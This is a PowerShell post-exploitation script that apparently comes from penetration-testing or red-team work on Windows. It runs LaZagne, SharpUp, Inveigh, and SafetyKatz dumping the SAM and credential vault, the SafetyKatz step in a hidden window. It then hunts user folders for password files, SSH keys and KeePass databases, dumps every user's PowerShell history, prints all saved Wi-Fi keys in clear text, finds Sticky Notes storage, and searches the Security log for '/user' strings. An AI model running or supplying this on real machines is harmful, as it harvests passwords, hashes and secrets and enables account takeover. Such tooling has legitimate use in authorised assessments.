$directory="C:\Users\" #change this
$string="password" #search strings
Import-Module .\enablePrivilege.ps1

$scriptBlock1 = {
    Start-Process -FilePath "cmd.exe" -ArgumentList @(
    "/c",
    "start",
    "cmd.exe",
    "/k",
    "$pwd\LaZagne.exe all"
    )
}

$scriptBlock2 = {
    Start-Process -FilePath "cmd.exe" -ArgumentList @(
    "/c",
    "start",
    "cmd.exe",
    "/k",
    "$pwd\SharpUp.exe audit"
    )
}
$ScriptBlock3 = {
Start-Process -FilePath "cmd.exe" -ArgumentList @(
    "/c",
    "start",
    "cmd.exe",
    "/k",
    "$pwd\safetykatz.exe privilege::debug token::elevate lsadump::sam `"vault::cred /patch`" exit"
    ) -WindowStyle Hidden
}
$scriptBlock4 = {
    Start-Process -FilePath "cmd.exe" -ArgumentList @(
    "/c",
    "start",
    "cmd.exe",
    "/k",
    "$pwd\Inveigh.exe"
    )
}
Invoke-Command -ScriptBlock $scriptBlock1
Invoke-Command -ScriptBlock $scriptBlock2
Invoke-Command -ScriptBlock $scriptBlock3
Invoke-Command -ScriptBlock $scriptBlock4

echo "====================================Find Juicy file direcotry----====================================================="
Get-ChildItem -Path $directory -Include *.txt,*.ini,*.cfg,*.config,*.xml,*.git,*.ps1,*.yml, *.pptx,*.log,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.txt,*.ini,*.exe,*.kdbx,*.rdp,*.vnc,*.cred,id_rsa,id_ecdsa -File -Recurse -ErrorAction SilentlyContinue
echo "=====================================Show Powershell history=========================================================="
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
echo "======================================Find string in file============================================================="
Get-ChildItem -Path $directory -Recurse -ErrorAction SilentlyContinue | Get-Content -ErrorAction SilentlyContinue | Select-String -Pattern $string
echo "======================================show all wifi PASSWORD=========================================================="
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
echo "======================================find sticky note storage========================================================"
foreach($user in ((ls C:\users).fullname)){dir "$user\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite" -ErrorAction SilentlyContinue}
echo "======================================find non default directory======================================================"
#folders to check
$foldersToCheck = @("C:\", "C:\Program Files", "C:\Program Files (x86)", "C:\Users")

# Default folders
$defaultFolders = @(
    "Windows", 
    "Program Files", 
    "Program Files (x86)", 
    "Common Files",
    "Internet Explorer",
    "Microsoft",
    "Microsoft.NET",
    "Windows Defender",
    "Windows Mail",
    "Windows Media Player",
    "Windows Multimedia Platform",
    "Windows NT",
    "Windows Photo Viewer",
    "Windows Portable Devices",
    "Windows Sidebar",
    "WindowsPowerShell",
    "Microsoft Update Health Tools",
    "ModifiableWindowsApps",
    "RUXIM",
    "Uninstall Information",
    "Windows Defender Advanced Threat Protection",
    "Windows Security",
    "WindowsApps",
    "$Recycle.Bin",
    "$WinREAgent",
    "Documents and Settings",
    "PerfLogs",
    "ProgramData",
    "Recovery",
    "System Volume Information",
    "Users",
    "Windows"
)

foreach ($folder in $foldersToCheck) {
    # Get subfolders in the current folder
    $subfolders = Get-ChildItem -Path $folder -Directory | Select-Object -ExpandProperty FullName

    # Filter out default folders
    $nonDefaultFolders = $subfolders | Where-Object { $folderName = $_ | Split-Path -Leaf; $defaultFolders -notcontains $folderName }

    # Display the results
    Write-Host ("Non-default folders in {0}:" -f $folder)
    foreach ($nonDefaultFolder in $nonDefaultFolders) {
        Write-Host ("  {0}" -f $nonDefaultFolder)
    }

    Write-Host
}
echo "======================================List Installed application======================================================"
Get-WmiObject -Class Win32_Product |  select Name, Version
echo "======================================read security log,find '/user' string==========================================="
wevtutil qe Security /rd:true /f:text | Select-String "/user"






